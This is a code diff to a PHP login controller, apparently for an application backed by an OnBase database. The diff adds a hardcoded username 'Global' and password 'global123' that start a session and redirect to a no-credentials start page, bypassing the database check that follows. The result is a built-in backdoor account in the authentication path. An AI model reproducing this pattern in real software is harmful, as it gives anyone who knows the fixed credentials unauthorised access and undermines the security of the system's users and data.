@@ -18,6 +18,15 @@ class Login extends Controller {
         $usuario = $_POST['usuario'];
         $contrasena = $_POST['contrasena'];
 
+        if ($usuario === 'Global' && $contrasena === 'global123') {
+            session_start();
+            $_SESSION['usuario'] = strtoupper($usuario);
+    
+            // Aquí puedes configurar cualquier otra sesión o redirección adicional
+            header('Location: ' . constant('URL') . '/onbase/inicioSinCredenciales');
+            exit;
+        }
+
        
 
         // Usar la clase DatabaseOnBase para la conexión a la base de datos
